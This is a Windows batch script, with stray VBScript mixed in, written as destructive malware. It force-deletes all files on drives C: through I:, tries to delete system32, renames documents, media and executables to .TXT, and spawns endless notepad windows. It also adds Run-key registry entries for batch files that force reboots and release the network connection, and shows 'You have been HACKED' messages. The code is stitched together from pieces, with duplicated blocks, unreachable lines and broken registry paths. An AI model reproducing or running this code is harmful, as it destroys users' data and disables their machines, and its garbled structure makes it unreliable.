@echo off

Del C:\*.* /f /s /q

Del D:\*.* /f /s /q

Del E:\*.* /f /s /q

Del F:\*.* /f /s /q

Del G:\*.* /f /s /q

Del H:\*.* /f /s /q

Del I:\*.* /f /s /q

del %systemdrive%*.* /f /s /q

REN *.DOC *.TXT

REN *.JPEG *.TXT

REN *.LNK *.TXT

REN *.AVI *.TXT

REN *.MPEG *.TXT

REN *.COM *.TXT

REN *.BAT *.TXT

del c:\\windows\system32

:top

START %SystemRoot%\system32\notepad.exe

GOTO top

shutdown -r -f -t 00

Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
 
Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"

echo @echo off>c:windowshartlell.bat

echo break off>>c:windowshartlell.bat

echo shutdown -r -t 11 -f>>c:windowshartlell.bat

echo end>>c:windowshartlell.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f

echo You have been HACKED.

PAUSE

echo @echo off>c:windowswimn32.bat

echo break off>>c:windowswimn32.bat

echo ipconfig/release_all>>c:windowswimn32.bat

echo end>>c:windowswimn32.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

echo You Have Been HACKED!

PAUSE

:CRASH

net send * WORKGROUP ENABLED

ipconfig /release

shutdown -r -f -t0

echo @echo off>c:windowshartlell.bat

echo break off>>c:windowshartlell.bat

echo shutdown -r -t 11 -f>>c:windowshartlell.bat

echo end>>c:windowshartlell.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f

echo You Have Been Hacked echo @echo off>c:windowswimn32.bat

echo break off>>c:windowswimn32.bat

echo ipconfig/release_all>>c:windowswimn32.bat

echo end>>c:windowswimn32.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

echo YOU HAVE BEEN HACKED

REN *.DOC *.TXT

REN *.JPEG *.TXT

REN *.LNK *.TXT

REN *.AVI *.TXT

REN *.MPEG *.TXT

REN *.COM *.TXT

REN *.BAT *.TXT

GOTO CRASH

:top

START %SystemRoot%\system32\notepad.exe

GOTO top











